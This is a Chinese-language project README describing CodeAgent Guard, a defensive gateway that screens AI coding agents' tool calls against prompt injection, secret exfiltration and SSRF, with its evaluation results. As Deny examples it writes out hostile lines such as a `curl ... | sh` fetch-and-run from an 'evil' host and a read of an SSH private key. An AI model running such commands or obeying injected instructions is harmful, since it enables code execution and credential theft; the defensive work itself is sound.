# CodeAgent Guard 技术报告 README

本文档用于撰写作品报告和答辩材料，概述当前 CodeAgent Guard 的技术框架、已实现能力、核心创新点、评测结果、优势与边界。

## 1. 项目定位

CodeAgent Guard 是一个面向 AI 编程 Agent 的工具调用安全网关。它位于 Agent 和真实副作用工具之间，对文件读写、Shell 命令、HTTP 请求、邮件发送、目录操作等工具调用进行执行前风险判定，并输出 `Allow / Ask / Deny` 三类决策。

项目目标不是替代 Agent，而是在 Agent 之外建立独立、可审计、可解释的安全边界。即使 Agent 被 README、代码注释、日志、HTTP 响应或工具输出中的提示注入污染，危险工具调用也必须先经过 Guard 的策略判定和审计记录。

一句话概括：

> CodeAgent Guard 在 AI Agent 和高风险工具之间加入执行前安全网关，通过 Policy Engine 与 CT-TRM 上下文污染风险模型，实现工具参数级 Allow / Ask / Deny 判定、审批闭环、全链路 Trace 和防篡改审计。

## 2. 要解决的问题

AI 编程 Agent 已经具备读文件、写代码、执行命令、访问网络、发送消息等真实系统能力。传统只依赖模型自身拒绝的方式存在明显不足：

- 仓库内容、README、代码注释、日志和工具输出都可能被植入提示注入。
- Agent 可能把不可信文本中的指令误当成用户任务继续执行。
- 危险行为经常发生在工具调用参数中，例如路径、命令、URL、邮件正文。
- 单纯检查工具名不够，必须检查具体参数和上下文来源。
- 安全判定如果无法审计，就难以复盘攻击链和证明系统行为。

CodeAgent Guard 的核心思路是把安全控制从 Agent 推理中分离出来，由独立的 Tool Proxy 和 Policy Engine 在副作用发生前强制执行。

## 3. 总体架构

```text
User / OpenCode / Built-in Agent
        |
        v
Tool Call Request
        |
        v
Tool Proxy
        |
        +---------------------+
        |                     |
        v                     v
Policy Engine            Transparency Trace
        |
        v
CT-TRM Risk Model
        |
        v
Allow / Ask / Deny
        |
        +-----------------------------+
        |              |              |
      Allow           Ask            Deny
        |              |              |
        v              v              v
Tool Executor   Approval Queue   Block + Explain
        |
        v
Audit Store + SHA-256 Hash Chain
```

### 模块职责

| 模块 | 位置 | 职责 |
|---|---|---|
| Built-in Agent | `guard/agent.py` | 内置 Agent 工具循环、上下文记忆、暂停和恢复 |
| OpenCode Adapter | `guard/adapters.py`、`opencode/` | 将 OpenCode 原生工具调用映射到 Guard 工具语义 |
| Tool Proxy | `guard/tools.py` | 所有工具调用的统一入口，连接策略、审批、执行和审计 |
| Policy Engine | `guard/policy.py` | 基础硬规则、路径/命令/URL/邮件参数检查、决策合并 |
| CT-TRM | `guard/taint.py`、`guard/risk_model.py` 等 | 上下文污染、实体传播、任务预算、链式风险和风险模式识别 |
| Task Budget | `guard/task_budget.py` | 根据用户任务推断合理工具能力和副作用上限 |
| Risk Patterns | `guard/risk_patterns.py` | P1-P15 风险模式检测 |
| Chain Risk | `guard/chain_risk.py` | 多步工具调用链风险分析 |
| Audit Store | `guard/audit.py` | SQLite 审计事件和 SHA-256 前向哈希链 |
| Transparency | `guard/transparency.py` | Trace Timeline、事件回放、前端透明详情 |
| Frontend Dashboard | `frontend/` | 安全总览、审批队列、Trace 回放、评测和可信工作区管理 |
| Evaluation | `guard/evaluation_ct_trm.py`、`benchmarks/` | 基础策略、泛化、objective、redteam 等评测体系 |

## 4. 核心决策模型

### 4.1 Allow / Ask / Deny

Guard 使用三类决策：

| 决策 | 含义 | 示例 |
|---|---|---|
| Allow | 低风险，直接允许执行 | 读取 workspace 内普通 README、搜索 TODO、运行明确的本地测试 |
| Ask | 合法但有副作用，需要用户确认 | 外部邮件无 secret、删除 workspace/tmp 普通文件、外部授权目录写入 |
| Deny | 明确危险或越权，不允许通过审批绕过 | SSH 私钥读取、secret 外传、metadata SSRF、`curl|sh`、危险删除 |

`Decision.add()` 使用单调升级逻辑：

- 默认是 `allow / low`。
- `ask` 可以把 `allow` 升级为人工确认。
- `deny` 优先级最高。
- 风险等级按 `low < medium < high < critical` 取最高。
- reasons 去重保存，用于前端解释和审计。

### 4.2 基础策略检查

基础 Policy Engine 覆盖以下维度：

- 工具是否在允许集合内。
- 文件路径是否在 workspace、可信工作环境或授权外部目录内。
- 路径穿越、敏感路径、SSH 私钥、`.env`、云凭据、系统文件检测。
- Shell 命令中的远程脚本执行、反弹 Shell、危险删除、网络工具绕过检测。
- HTTP 请求中的 localhost、private IP、metadata、重定向 SSRF 检测。
- 邮件收件人是否外部、正文或附件是否包含 secret。
- 删除、移动、外部写入、桌面目录打开等副作用是否需要 Ask。

### 4.3 CT-TRM 模型

CT-TRM 的英文名是 Context-Taint Tool Risk Model，即上下文污染驱动的 Agent 工具调用风险决策模型。

CT-TRM 不替代基础硬规则，而是在基础规则之后补充上下文和链式风险判断。其核心能力包括：

- Source 建模：区分用户任务、Agent 计划、仓库文件、配置文件、代码注释、日志输出、工具输出、HTTP 响应等来源。
- Entity 抽取：识别 path、url、email、secret、command、instruction、domain、IP 等实体。
- Taint 传播：记录不可信来源中的实体如何进入工具参数。
- Provenance Graph：保存 source/entity/tool argument 的传播边。
- Task Budget：根据用户任务推断合理工具和最大副作用范围。
- Chain Risk：分析多步工具调用链，例如先读 secret 再发送邮件。
- Risk Patterns：实现 P1-P15 结构化风险模式。
- Score Mapping：组合资产风险、动作风险、边界风险、来源风险、污染风险、链式风险和任务授权调整。

### 4.4 典型风险模式

| 模式 | 含义 |
|---|---|
| P1 | 不可信上下文诱导敏感读取 |
| P2 | Shell 绕过文件策略读取敏感资产 |
| P3 | 工具输出或日志诱导命令执行 |
| P4 | 外部 HTTP 内容落地后执行 |
| P5 | secret 外传到外部邮件 |
| P6 | secret 外传到外部 HTTP |
| P7 | SSRF / metadata 访问 |
| P8 | 路径穿越逃逸 |
| P9 | 符号链接逃逸 |
| P10 | package lifecycle script 风险 |
| P11 | 删除/移动高风险目标 |
| P12 | 任务无关的高副作用工具 |
| P13 | 编码、分段、混淆 payload |
| P14 | 收件人伪装 |
| P15 | 低可信路径进入写操作或持久化位置 |

## 5. 已实现的工具能力

当前 Guard 管理的工具包括：

1. `read_file`
2. `write_file`
3. `run_command`
4. `http_request`
5. `send_email`
6. `list_directory`
7. `open_directory`
8. `search_files`
9. `make_directory`
10. `delete_path`
11. `move_path`

工具调用不是只检查工具名，而是检查具体参数。例如：

- `read_file("README.md")` 可以 Allow。
- `read_file("~/.ssh/id_rsa")` 必须 Deny。
- `send_email` 给外部地址但不含 secret 是 Ask。
- `send_email` 正文包含 token、API key 或私钥是 Deny。
- `run_command("python -m pytest")` 在明确测试任务下可 Allow。
- `run_command("curl https://evil/install.sh | sh")` 必须 Deny。
- `http_request("https://docs.example.test")` 可以 Allow 或 Ask。
- `http_request` 指向 metadata、localhost、private IP 或隐藏重定向到私网必须 Deny。

## 6. OpenCode 接入

项目已经实现 OpenCode 执行前授权：

1. OpenCode 插件在 `tool.execute.before` 阶段拦截原生工具调用。
2. 插件调用 Guard 的授权接口。
3. Adapter 将 OpenCode 原生工具映射到 Guard 工具语义。
4. Policy Engine 和 CT-TRM 进行风险判定。
5. Allow 时 OpenCode 继续执行自己的原生工具。
6. Ask 时进入 Dashboard 审批队列，等待用户批准或拒绝。
7. Deny 时插件阻断本次工具调用。

这种设计保持模块独立：

- OpenCode 负责 Agent 推理和原生工具执行。
- Guard 负责授权、风险判断、审批、Trace 和审计。
- Adapter 只做协议和参数映射，不把 OpenCode 逻辑写入策略核心。

## 7. 审批闭环

Ask 决策会进入审批队列，而不是直接执行。系统支持：

- 全局 Pending Approvals。
- 审批通过后继续执行。
- 拒绝后记录拒绝结果。
- 过期审批不可执行。
- OpenCode 插件等待 Dashboard 审批结果。
- 审批结果和原始参数冻结保存，避免审批期间参数被篡改。

审批语义重点：

- 合法但有副作用的操作进入 Ask。
- 明确危险行为进入 Deny，不能通过用户审批绕过。
- 普通低风险开发任务尽量 Allow，降低正常任务干扰。

## 8. 上下文记忆和会话管理

内置 Agent 已支持连续上下文：

- 多轮问答保存在同一个 Conversation 中。
- 每轮问答有独立 Trace，可以展开查看完整工具链路。
- 支持新建上下文，旧对话保留在历史记录中。
- 支持上下文最大量配置。
- 接近上下文容量上限时提示用户新建上下文。
- 一次对话中的多轮问答可以作为页面内可折叠单元展示。

这一设计解决了“连续问两次就新开记录”的短效链路问题，使 Agent 更接近 GPT 网页版的使用体验，同时仍保留每轮工具调用的安全审计。

## 9. 可信工作环境

项目支持配置可信工作环境和外部授权目录：

- workspace 是当前项目默认受控根目录。
- trusted workspace 是用户主动添加的可信目录。
- external write root 是临时授权的外部写入范围。

安全边界没有因为“可信目录”而取消：

- 敏感文件仍然 Deny。
- secret 外传仍然 Deny。
- 危险 shell 仍然 Deny。
- 根目录破坏、未授权目录删除仍然 Deny。
- 外部授权目录中的写入、删除、打开通常仍需要 Ask。

## 10. Trace 和审计

系统为每次工具调用生成透明事件：

- 用户任务
- Agent 工具请求
- Policy Engine 判定
- CT-TRM 风险证据
- Tool Proxy 行动
- 工具执行结果
- 用户审批结果
- Audit Hash Chain 记录

Audit 使用 SQLite 保存事件，并使用 SHA-256 前向哈希链连接事件。这样可以检测普通事后篡改，并定位断链位置。

前端 Dashboard 可以展示：

- 实时调用时间线
- Trace 详情
- 风险原因
- CT-TRM evidence
- 审批状态
- Audit Chain 完整性
- Benchmark / Evaluation 结果

## 11. 评测体系

项目已形成多层评测体系：

### 11.1 基础策略回归

覆盖 100 条基础工具策略用例，验证常规 Allow / Ask / Deny 逻辑。

### 11.2 AgentToolBench 泛化评测

包含：

- `dev_calibration`
- `benchmark_jsonl_external_fixed`
- `holdout_generated`
- `redteam_unseen`

当前结果：

| Dataset | Cases | Accuracy | Attack Intervention | Strong Block | Complete FN | Normal Disruption |
|---|---:|---:|---:|---:|---:|---:|
| dev_calibration | 300 | 97.33% | 100.0% | 100.0% | 0.0% | 0.0% |
| benchmark_jsonl_external_fixed | 473 | 96.83% | 98.86% | 98.58% | 1.14% | 6.78% |
| holdout_generated | 300 | 99.33% | 100.0% | 100.0% | 0.0% | 0.0% |
| redteam_unseen | 150 | 100.0% | 100.0% | 100.0% | 0.0% | 0.0% |

说明：这些结果证明当前规则在多个未参与校准的数据集上保持稳定，但不代表对所有未知攻击具有绝对泛化能力。

### 11.3 Objective Evaluation

目标是验证真实可用性和误报控制，而不是继续优化固定 benchmark。

| Dataset | Metric | Before | After |
|---|---:|---:|---:|
| Blind LLM Test | Accuracy | 66.5% | 100.0% |
| Blind LLM Test | Normal Disruption | 37.5% | 0.0% |
| Blind LLM Test | Complete FN | 0.0% | 0.0% |
| Blind LLM Test | Attack Intervention | 100.0% | 100.0% |
| Real Agent E2E | Accuracy | 67.5% | 100.0% |
| Real Agent E2E | Task Completion | 60.0% | 100.0% |
| Real Agent E2E | False Positive | 40.0% | 0.0% |
| External Red-Team | Accuracy | 65.0% | 100.0% |
| External Red-Team | Strong Block | 62.16% | 100.0% |
| External Red-Team | Complete FN | 0.0% | 0.0% |
| External Red-Team | Attack Intervention | 100.0% | 100.0% |

### 11.4 测试状态

当前验证命令：

```bash
python -m unittest discover -s tests -v
python scripts/check_no_benchmark_overfit.py
python -m guard.evaluation_generalization --all --output-dir reports/generalization/
python -m benchmarks.objective_eval.real_agent_e2e.run_real_agent_e2e --output reports/objective_eval/real_agent_e2e_after.json
python -m benchmarks.objective_eval.external_redteam.run_redteam_eval --output reports/objective_eval/external_redteam_after.json
```

当前结果：

- 单元测试：130 passed，1 skipped。
- skipped 原因：当前系统环境不支持 symlink 创建，相关测试按预期跳过。
- benchmark overfit 检查：passed。
- objective after 评测：Blind / Real Agent / External Red-Team 均保持 0% complete false negative 和 100% attack intervention。

## 12. 当前技术优势

### 12.1 Agent 与安全策略解耦

Guard 不依赖具体 LLM 的自觉拒绝。模型可以替换，Agent 可以替换，但工具调用仍必须经过统一策略网关。

### 12.2 参数级风险判断

系统不只判断“能不能用某工具”，还判断“这个工具这次用的参数是否安全”。这比简单工具白名单更细。

### 12.3 支持灰区审批

Ask 决策保留用户确认通道，避免把所有有副作用操作都粗暴 Deny，也避免直接 Allow 外部写入、邮件、删除等操作。

### 12.4 上下文污染建模

CT-TRM 能把 README、日志、配置、HTTP 响应、工具输出等低可信来源纳入风险传播分析，适合防提示注入和间接工具滥用。

### 12.5 多步攻击链检测

Chain Risk 可以识别先读 secret、再发邮件或 HTTP 外传，先下载脚本、再写入执行等跨工具攻击链。

### 12.6 支持 OpenCode

系统不是只服务内置 Agent，也能通过 Adapter 接入外部 Agent。OpenCode 使用自己的工具执行，Guard 只负责执行前授权。

### 12.7 可审计和可回放

每次调用都有 reasons、risk level、CT-TRM evidence、Trace 事件和 Audit Hash Chain，适合比赛演示、攻击复盘和策略解释。

### 12.8 可用性经过校准

最新 objective evaluation 中，普通任务误报显著降低：

- Blind LLM normal disruption 从 37.5% 降到 0.0%。
- Real Agent false positive 从 40.0% 降到 0.0%。
- 同时 complete false negative 保持 0.0%。

## 13. 适合报告突出的创新点

1. **执行前安全网关**
   Agent 生成工具调用后，副作用发生前必须经过 Guard。

2. **上下文污染驱动风险模型**
   不只看当前参数，还看参数来自哪里、是否被不可信上下文污染、是否处于多步攻击链中。

3. **Allow / Ask / Deny 三分法**
   兼顾安全和可用性，明确区分低风险、需确认、强阻断。

4. **Agent 无关协议**
   内置 Agent 和 OpenCode 共用同一套授权、审计、Trace 和评测能力。

5. **可解释审计链**
   每个决策都有 reason、risk evidence 和 hash chain 记录，便于复盘和证明。

6. **反过拟合评测**
   使用 dev、fixed benchmark、holdout、redteam、blind、real-agent 等多套数据验证，不只看单一 benchmark。

7. **可用性误报校准**
   针对正常开发任务和灰区任务降低误报，同时保持 secret、SSRF、危险 shell 等硬规则不放松。

## 14. 当前边界

报告中应如实说明以下边界：

- 当前项目是安全原型系统，不是完整生产沙箱。
- `run_command` 有策略检查，但仍需要容器、非特权用户、seccomp、只读挂载等 OS 级隔离增强。
- 当前服务默认适合本机或受控环境，生产部署还需要认证、RBAC、TLS、CSRF 防护。
- OpenCode Ask 恢复依赖 Hook 进程仍在等待，进程退出或超时后不能恢复原调用。
- Agent 对话和部分本地运行数据属于本地私有状态，应排除 Git 提交。
- 当前评测结果只代表现有测试集和本地 objective eval，不应表述为“防御所有未知攻击”。

推荐表述：

> 在多个未参与校准的数据集上，CT-TRM 保持了较高攻击干预率，并显著降低了正常任务误报。但该结论限定于当前测试集和本地评测环境，不代表对所有未知攻击的绝对防护。

## 15. 可演示流程

建议比赛演示按以下顺序：

1. 正常任务：读取 README、搜索 TODO、运行 `python -m pytest`，展示 Allow。
2. 灰区任务：发送外部测试邮件或删除 workspace/tmp 文件，展示 Ask 和审批队列。
3. 明确攻击：读取 `~/.ssh/id_rsa`、执行 `curl|sh`、访问 metadata，展示 Deny。
4. 上下文污染：README 或工具输出诱导发送 secret，展示 CT-TRM evidence。
5. OpenCode 接入：让 OpenCode 发起工具调用，展示 Guard 执行前授权。
6. Trace 回放：展开一次调用的完整事件链。
7. Audit Hash Chain：展示审计链完整性。
8. Evaluation：展示 objective before/after 和 generalization summary。

## 16. 报告摘要模板

CodeAgent Guard 是一个面向 AI 编程 Agent 的工具调用安全网关。项目在 Agent 与文件、Shell、网络、邮件等高风险工具之间加入 Tool Proxy，通过 Policy Engine 和 CT-TRM 上下文污染风险模型，对每次工具调用进行参数级 Allow / Ask / Deny 判定。系统支持内置 Agent 与 OpenCode 执行前授权，提供可信工作环境、上下文记忆、审批闭环、Trace 回放和 SHA-256 审计哈希链。评测方面，项目构建了基础策略回归、AgentToolBench 泛化验证、Blind LLM、Real Agent E2E 和 External Red-Team 等多层评测。当前 objective evaluation 显示，正常任务干扰率从 37.5% 降至 0.0%，真实 Agent 任务完成率从 60.0% 提升到 100.0%，同时攻击干预率保持 100.0%，complete false negative 保持 0.0%。这些结果说明系统在当前测试集上能够在保持强安全干预的同时改善可用性。

